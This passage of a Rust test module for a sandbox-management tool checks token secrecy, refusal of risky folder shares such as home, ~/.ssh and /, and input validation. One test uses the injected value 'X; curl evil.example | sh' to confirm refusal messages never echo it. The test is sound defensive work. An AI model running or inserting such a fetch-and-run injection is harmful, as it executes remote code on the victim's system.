    fn repo_provider_is_created_before_the_sandbox_through_the_environment() {
        let f = Fake::new("repo-ok");
        let repo = ghrepo::parse_url("https://github.com/o/r")
            .unwrap()
            .repo(ghrepo::Forge::GitHub)
            .unwrap();
        let var = ghrepo::token_env(&repo);
        std::env::set_var("OSH_FAKE_ENV_KEYS", var);
        let value = secret_value();
        std::env::set_var("OSH_TEST_TOK", &value);
        let v = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        v.unwrap();
        let calls = f.calls();
        assert!(!calls.contains(&value), "{calls}");
        let lines: Vec<&str> = calls.lines().collect();
        let prov = lines
            .iter()
            .position(|l| l.starts_with("provider create --name github-w1-r"))
            .unwrap_or_else(|| panic!("{calls}"));
        assert_eq!(lines[prov + 1], format!("env {var} set"), "{calls}");
        let create = lines
            .iter()
            .position(|l| l.starts_with("sandbox create"))
            .unwrap();
        assert!(prov < create, "{calls}");
        assert!(lines[create].contains("--provider github-w1-r"), "{calls}");
    }

    #[test]
    fn dry_run_with_repo_creates_no_provider() {
        let f = Fake::new("repo-dry");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let v = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), true);
        std::env::remove_var("OSH_TEST_TOK");
        let v = v.unwrap();
        assert!(!v.to_string().contains(&secret_value()));
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn list_gives_name_phase_created() {
        let f = Fake::new("list");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"2026-01-01","conditions":[]}]}"#,
        );
        let v = sandbox_list(&f.ctx()).unwrap();
        assert_eq!(
            v,
            json!([{"name":"w1","phase":"Ready","created":"2026-01-01"}])
        );
    }

    #[test]
    fn list_failure_is_err() {
        let f = Fake::new("list-fail");
        std::env::set_var("OSH_FAKE_FAIL", "sandbox list");
        assert!(sandbox_list(&f.ctx()).is_err());
    }

    #[test]
    fn delete_runs_sandbox_delete() {
        let f = Fake::new("delete");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let v = sandbox_delete(&f.ctx(), "w1").unwrap();
        assert_eq!(v, json!({"name":"w1","deleted":true}));
        assert!(f.calls().lines().any(|l| l == "sandbox delete w1"));
    }

    #[test]
    fn delete_of_a_sandbox_already_gone_is_ok_and_still_drops_providers() {
        let f = Fake::new("delete-gone");
        let v = sandbox_delete(&f.ctx(), "w1").unwrap();
        assert_eq!(v, json!({"name":"w1","deleted":false,"already_gone":true}));
        let calls = f.calls();
        assert!(!calls.contains("sandbox delete"), "{calls}");
        // The provider list is read only for `drop_repo_providers`.
        assert!(
            calls.lines().any(|l| l.starts_with("provider list")),
            "{calls}"
        );
    }

    #[test]
    fn delete_tries_anyway_when_the_list_fails() {
        let f = Fake::new("delete-nolist");
        std::env::set_var("OSH_FAKE_FAIL", "sandbox list");
        let v = sandbox_delete(&f.ctx(), "w1").unwrap();
        assert_eq!(v, json!({"name":"w1","deleted":true}));
        assert!(f.calls().lines().any(|l| l == "sandbox delete w1"));
    }

    fn one_shot_with_repo() -> Value {
        let mut s = with_repo("OSH_TEST_TOK");
        s["command"] = json!("make test");
        s
    }

    #[test]
    fn a_one_shot_create_drops_its_repo_provider_after_it_ran() {
        for fail in [false, true] {
            let f = Fake::new(if fail { "oneshot-fail" } else { "oneshot-ok" });
            if fail {
                std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
            }
            std::env::set_var("OSH_TEST_TOK", secret_value());
            let r = sandbox_create(&f.ctx(), &one_shot_with_repo(), false);
            std::env::remove_var("OSH_TEST_TOK");
            assert_eq!(r.is_err(), fail, "{r:?}");
            let calls = f.calls();
            let lines: Vec<&str> = calls.lines().collect();
            let create = lines
                .iter()
                .position(|l| l.starts_with("sandbox create"))
                .unwrap_or_else(|| panic!("{calls}"));
            assert!(
                lines[create].contains("--no-keep -- sh -c make test"),
                "{calls}"
            );
            let gone = lines
                .iter()
                .position(|l| *l == "provider delete github-w1-r")
                .unwrap_or_else(|| panic!("{calls}"));
            assert!(create < gone, "{calls}");
            assert_eq!(
                lines
                    .iter()
                    .filter(|l| l.starts_with("provider delete"))
                    .count(),
                1,
                "{calls}"
            );
        }
    }

    #[test]
    fn a_kept_create_keeps_its_repo_provider() {
        let f = Fake::new("kept");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        r.unwrap();
        assert!(!f.calls().contains("provider delete"), "{}", f.calls());
    }

    #[test]
    fn a_profile_import_that_lost_a_race_carries_on() {
        let f = Fake::new("import-race");
        // The first describe says "missing", the import then fails ("already exists": the other
        // create made it), and the second describe finds it.
        std::env::set_var("OSH_FAKE_FAIL_ONCE", "profile describe");
        std::env::set_var("OSH_FAKE_FAIL", "profile import");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        r.unwrap();
        let calls = f.calls();
        let lines: Vec<&str> = calls.lines().collect();
        let import = lines
            .iter()
            .find(|l| l.starts_with("profile import --file "))
            .unwrap_or_else(|| panic!("{calls}"));
        let file = Path::new(import.trim_start_matches("profile import --file "));
        assert!(!file.exists(), "{file:?}");
        let name = file.file_name().unwrap().to_string_lossy().into_owned();
        assert!(name.contains(&std::process::id().to_string()), "{name}");
        assert_eq!(
            lines
                .iter()
                .filter(|l| l.starts_with("profile describe"))
                .count(),
            2,
            "{calls}"
        );
        assert!(
            calls.contains("provider create --name github-w1-r"),
            "{calls}"
        );
        assert!(calls.contains("sandbox create"), "{calls}");
        // Not this call's profile: never deleted by it.
        assert!(!calls.contains("profile delete"), "{calls}");
    }

    #[test]
    fn a_failed_import_without_the_profile_is_err() {
        let f = Fake::new("import-fail");
        std::env::set_var("OSH_FAKE_FAIL", "profile ");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        assert!(r.is_err());
        let calls = f.calls();
        assert!(calls.contains("profile import"), "{calls}");
        assert!(!calls.contains("provider create"), "{calls}");
        assert!(!calls.contains("sandbox create"), "{calls}");
    }

    /// A folder that is not under a system folder on any test host (macOS temp dirs resolve
    /// to `/private/var/...`, which is one).
    fn project_dir(tag: &str) -> PathBuf {
        let d = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../target")
            .join(format!("osh-share-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("app")).unwrap();
        d.join("app")
    }

    fn share_ctx(f: &Fake, refuse: bool) -> Ctx {
        Ctx {
            allow_share: true,
            refuse_risky_share: refuse,
            ..f.ctx()
        }
    }

    #[test]
    fn risky_shares_are_refused_over_mcp_and_noted_on_the_cli() {
        let f = Fake::new("risky");
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        let to_root = f.dir.parent().unwrap().join("to-root");
        std::os::unix::fs::symlink("/", &to_root).unwrap();
        let h = home.to_str().unwrap();
        for p in [
            PathBuf::from("/"),
            to_root.clone(),
            home.clone(),
            home.join(".ssh"),
        ] {
            let e = create_in(&share_ctx(&f, true), &with_share(&p), true, h).unwrap_err();
            assert!(e.contains("refused"), "{p:?}: {e}");
            let e = apply_in(&share_ctx(&f, true), &with_share(&p), h).unwrap_err();
            assert!(e.contains("refused"), "{p:?}: {e}");
            let cli = create_in(&share_ctx(&f, false), &with_share(&p), true, h);
            if std::fs::canonicalize(&p).unwrap() == Path::new("/") {
                // The disk has no folder name to mount under, so the CLI cannot share it either.
                assert!(cli.unwrap_err().contains("no folder name"), "{p:?}");
                continue;
            }
            let v = cli.unwrap();
            let note = v["note"].as_str().unwrap_or_else(|| panic!("{p:?}: {v}"));
            assert!(note.contains("risky"), "{note}");
        }
        assert!(!f.calls().contains("sandbox create"), "{}", f.calls());
        // The symlink is refused as what it points at.
        let e = create_in(&share_ctx(&f, true), &with_share(&to_root), true, h).unwrap_err();
        assert!(e.contains("sharing / is refused"), "{e}");
    }

    #[test]
    fn mcp_shares_must_lie_inside_a_share_root() {
        let f = Fake::new("roots");
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let h = home.to_str().unwrap();
        let base = project_dir("roots");
        let root = base.join("proj");
        for d in ["proj/sub", "proj-evil", "outside"] {
            std::fs::create_dir_all(base.join(d)).unwrap();
        }
        std::os::unix::fs::symlink(base.join("outside"), root.join("link")).unwrap();
        let root = std::fs::canonicalize(&root).unwrap();
        let mcp = |roots: Vec<PathBuf>| Ctx {
            share_roots: Some(roots),
            ..share_ctx(&f, true)
        };
        let ctx = mcp(vec![root.clone()]);
        for ok in [root.join("sub"), root.clone()] {
            let v = create_in(&ctx, &with_share(&ok), true, h).unwrap();
            assert!(v.get("note").is_none(), "{ok:?}: {v}");
            apply_in(&ctx, &with_share(&ok), h).unwrap();
        }
        for bad in [
            base.join("outside"),
            base.join("proj-evil"),
            root.join("link"),
            root.join("../outside"),
        ] {
            for e in [
                create_in(&ctx, &with_share(&bad), true, h).unwrap_err(),
                apply_in(&ctx, &with_share(&bad), h).unwrap_err(),
            ] {
                let real = std::fs::canonicalize(&bad).unwrap();
                assert!(
                    e.contains(real.to_str().unwrap())
                        && e.contains("outside the allowed share roots"),
                    "{bad:?}: {e}"
                );
            }
        }
        // Shares on but no valid root: every share is refused, naming the variable.
        let e = create_in(&mcp(Vec::new()), &with_share(&root), true, h).unwrap_err();
        assert!(e.contains("OSH_MCP_SHARE_ROOT"), "{e}");
        // The CLI has no roots: a folder outside them is shared as before.
        create_in(
            &share_ctx(&f, false),
            &with_share(&base.join("outside")),
            true,
            h,
        )
        .unwrap();
        // Only the accepted shares reached `sandbox create` (apply is not a dry run).
        let calls = f.calls();
        assert!(
            !calls.contains("/outside") && !calls.contains("proj-evil"),
            "{calls}"
        );
        let _ = std::fs::remove_dir_all(base.parent().unwrap());
    }

    #[test]
    fn a_project_folder_is_shared_by_its_real_path() {
        let f = Fake::new("project");
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let project = project_dir("real");
        let real = std::fs::canonicalize(&project).unwrap();
        let link = f.dir.parent().unwrap().join("app");
        std::os::unix::fs::symlink(&project, &link).unwrap();
        let h = home.to_str().unwrap();
        let v = create_in(&share_ctx(&f, true), &with_share(&link), false, h).unwrap();
        assert!(v.get("note").is_none(), "{v}");
        let calls = f.calls();
        let line = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap();
        let real = real.to_str().unwrap();
        assert!(line.contains(&format!("\"source\":\"{real}\"")), "{line}");
        let label = format!("{}={}", cli::SHARE_LABEL, cli::share_key(real));
        assert!(line.contains(&label), "{line}");
        let _ = std::fs::remove_dir_all(project.parent().unwrap());
    }

    #[test]
    fn a_risky_note_joins_the_policy_note() {
        let f = Fake::new("two-notes");
        std::fs::write(f.dir.join("toolchains.toml"), "not [valid").unwrap();
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let v = create_in(
            &share_ctx(&f, false),
            &with_share(&home),
            true,
            home.to_str().unwrap(),
        )
        .unwrap();
        let note = v["note"].as_str().unwrap();
        assert!(
            note.contains("risky") && note.contains("toolchains.toml"),
            "{note}"
        );
    }

    #[test]
    fn repo_vars_limit_what_env_var_may_name() {
        let f = Fake::new("repo-vars");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let with = |list: Option<&[&str]>| Ctx {
            repo_vars: list.map(|l| l.iter().map(|s| s.to_string()).collect()),
            ..f.ctx()
        };
        let none = sandbox_create(&with(Some(&[])), &with_repo("OSH_TEST_TOK"), true);
        let other = sandbox_create(&with(Some(&["OTHER"])), &with_repo("OSH_TEST_TOK"), true);
        let ok = sandbox_create(
            &with(Some(&["OTHER", "OSH_TEST_TOK"])),
            &with_repo("OSH_TEST_TOK"),
            true,
        );
        let cli_any = sandbox_create(&with(None), &with_repo("OSH_TEST_TOK"), true);
        let applied = apply(&with(Some(&[])), &with_repo("OSH_TEST_TOK"));
        std::env::remove_var("OSH_TEST_TOK");
        let e = none.unwrap_err();
        assert!(e.contains("OSH_MCP_REPO_VARS"), "{e}");
        let e = other.unwrap_err();
        assert!(
            e.contains("OSH_TEST_TOK") && e.contains("OSH_MCP_REPO_VARS"),
            "{e}"
        );
        for e in [&e, &applied.unwrap_err()] {
            assert!(!e.contains(&secret_value()), "{e}");
        }
        ok.unwrap();
        cli_any.unwrap();
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn a_stored_secret_allows_its_name_and_supplies_the_token() {
        let f = Fake::new("stored-secret");
        std::env::remove_var("OSH_TEST_STORED");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        let refused = sandbox_create(&ctx, &with_repo("OSH_TEST_STORED"), true).unwrap_err();
        assert!(
            refused.contains("osh mcp secret set OSH_TEST_STORED"),
            "the refusal says what to run: {refused}"
        );
        crate::secrets::set(&ctx.dir, "OSH_TEST_STORED", &secret_value()).unwrap();
        sandbox_create(&ctx, &with_repo("OSH_TEST_STORED"), true).unwrap();
        let other = sandbox_create(&ctx, &with_repo("OSH_TEST_OTHER"), true).unwrap_err();
        assert!(
            !other.contains("OSH_TEST_STORED"),
            "a refusal does not list the stored names: {other}"
        );
        assert!(!other.contains(&secret_value()), "{other}");
        // The stored token wins over a variable of the same name in the server's environment.
        std::env::set_var("OSH_TEST_STORED", "from-env");
        assert_eq!(
            repo_secret(&ctx, "OSH_TEST_STORED").unwrap(),
            secret_value()
        );
        std::env::remove_var("OSH_TEST_STORED");
        assert!(repo_secret(&ctx, "OSH_TEST_NOPE")
            .unwrap_err()
            .contains("secret set"));
    }

    #[test]
    fn the_refusal_suggests_a_command_only_for_a_usable_name() {
        let f = Fake::new("hint-name");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        let evil = "X; curl evil.example | sh";
        let e = sandbox_create(&ctx, &with_repo(evil), true).unwrap_err();
        assert!(!e.contains("curl") && !e.contains("secret set X"), "{e}");
        let e = repo_secret(&ctx, evil).unwrap_err();
        assert!(!e.contains("curl") && !e.contains("secret set X"), "{e}");
    }

    #[test]
    fn a_stored_name_takes_its_value_from_the_store_never_the_environment() {
        let f = Fake::new("store-first");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        std::env::set_var("OSH_TEST_SHADOW", "the-servers-real-credential");
        // Not stored and not listed: refused, whatever the environment holds.
        assert!(sandbox_create(&ctx, &with_repo("OSH_TEST_SHADOW"), true).is_err());
        assert!(repo_secret(&ctx, "OSH_TEST_SHADOW").is_err());
        crate::secrets::set(&ctx.dir, "OSH_TEST_SHADOW", "the-stored-token").unwrap();
        assert_eq!(
            repo_secret(&ctx, "OSH_TEST_SHADOW").unwrap(),
            "the-stored-token"
        );
        // The store entry goes away between the check and the read: the environment is still
        // not a way round the operator's list.
        crate::secrets::remove(&ctx.dir, "OSH_TEST_SHADOW").unwrap();
        assert!(repo_secret(&ctx, "OSH_TEST_SHADOW").is_err());
        // A listed name still reads the environment.
        let listed = Ctx {
            repo_vars: Some(vec!["OSH_TEST_SHADOW".into()]),
            ..f.ctx()
        };
        assert_eq!(
            repo_secret(&listed, "OSH_TEST_SHADOW").unwrap(),
            "the-servers-real-credential"
        );
        std::env::remove_var("OSH_TEST_SHADOW");
    }

    #[test]
    fn over_mcp_a_share_of_the_data_folder_or_one_holding_it_is_refused() {
        let f = Fake::new("share-data");
        let ctx = share_ctx(&f, true);
        let inside = f.dir.join("mcp-secrets");
        std::fs::create_dir_all(&inside).unwrap();
        for p in [f.dir.clone(), inside, f.dir.parent().unwrap().to_path_buf()] {
            let e = create_in(&ctx, &with_share(&p), true, "/nonexistent-home").unwrap_err();
            assert!(
                e.contains("refused") && e.contains("osh's own data"),
                "{p:?}: {e}"
            );
        }
        // On the command line it is a note, as for other risky folders.
        let cli = share_ctx(&f, false);
        let r = create_in(&cli, &with_share(&f.dir), true, "/nonexistent-home").unwrap();
        assert!(r.to_string().contains("osh's own data"), "{r}");
    }

    #[test]
    fn delete_and_exec_validate_the_name() {
        let f = Fake::new("badname");
        assert!(sandbox_delete(&f.ctx(), "../x").is_err());
        assert!(sandbox_exec(&f.ctx(), "-n", &["ls".into()]).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn exec_nonzero_is_ok_with_exit_code() {
        let f = Fake::new("exec");
        std::env::set_var("OSH_FAKE_EXEC_EXIT", "3");
        std::env::set_var("OSH_FAKE_EXEC_STDOUT", "out");
        std::env::set_var("OSH_FAKE_EXEC_STDERR", "err");
        let argv = vec!["sh".to_string(), "-c".into(), "exit 3".into()];
        let v = sandbox_exec(&f.ctx(), "w1", &argv).unwrap();
        assert_eq!(v, json!({"exit_code":3,"stdout":"out","stderr":"err"}));
        let calls = f.calls();
        let line = calls.lines().next().unwrap();
        assert!(line.starts_with("sandbox exec -n w1 "), "{line}");
        assert!(line.ends_with("-- sh -c exit 3"), "{line}");
    }

    #[test]
    fn exec_needs_a_command() {
        let f = Fake::new("exec-empty");
        assert!(sandbox_exec(&f.ctx(), "w1", &[]).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn apply_unchanged_when_exists() {
        let f = Fake::new("apply-same");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let v = apply(&f.ctx(), &spec()).unwrap();
        assert_eq!(v, json!({"action":"unchanged","name":"w1"}));
        assert!(!f.calls().contains("create"), "{}", f.calls());
    }

    #[test]
    fn apply_creates_when_absent() {
        let f = Fake::new("apply-new");
        let v = apply(&f.ctx(), &spec()).unwrap();
        assert_eq!(v, json!({"action":"created","name":"w1"}));
        assert!(f.calls().lines().any(|l| l.starts_with("sandbox create")));
    }

    #[test]
    fn apply_validates_before_listing() {
        let f = Fake::new("apply-bad");
        assert!(apply(&f.ctx(), &json!({"name":"../x"})).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn envelope_maps_err_to_ok_false_exit_1() {
        assert_eq!(envelope(Ok(json!({"a":1}))), (json!({"a":1}), 0));
        assert_eq!(
            envelope(Err("boom".into())),
            (json!({"ok":false,"error":"boom"}), 1)
        );
    }

    #[test]
    fn output_within_returns_a_quick_commands_output_even_when_it_is_large() {
        let mut c = Command::new("sh");
        c.args(["-c", "head -c 3000000 /dev/zero; echo done >&2; exit 3"]);
        let t = std::time::Instant::now();
        let out = output_within(c, std::time::Duration::from_secs(30)).unwrap();
        assert!(t.elapsed() < std::time::Duration::from_secs(10));
        assert_eq!((out.stdout.len(), out.status.code()), (3_000_000, Some(3)));
        assert_eq!(String::from_utf8_lossy(&out.stderr).trim(), "done");
    }

    #[test]
    fn output_within_gives_up_on_a_command_that_never_answers() {
        let mut c = Command::new("sleep");
        c.arg("30");
        let t = std::time::Instant::now();
        let e = output_within(c, std::time::Duration::from_millis(700)).unwrap_err();
        assert!(
            t.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            t.elapsed()
        );
        assert!(e.contains("did not answer"), "{e}");
    }

    #[test]
    fn sandbox_exists_and_the_active_gateway_come_from_the_cli_lists() {
        let f = Fake::new("ops-exists");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        assert_eq!(sandbox_exists(&f.ctx(), "w1"), Ok(true));
        assert_eq!(sandbox_exists(&f.ctx(), "w2"), Ok(false));
        std::env::set_var("OSH_FAKE_FAIL", "sandbox list");
        assert!(
            sandbox_exists(&f.ctx(), "w1").is_err(),
            "a failed list is not 'gone'"
        );
        std::env::remove_var("OSH_FAKE_FAIL");
        assert_eq!(active_gateway(), Ok(None));
        std::env::set_var(
            "OSH_FAKE_GATEWAYS",
            r#"[{"name":"a","endpoint":"e","active":false},{"name":"b","endpoint":"e","active":true}]"#,
        );
        assert_eq!(active_gateway(), Ok(Some("b".to_string())));
    }
}
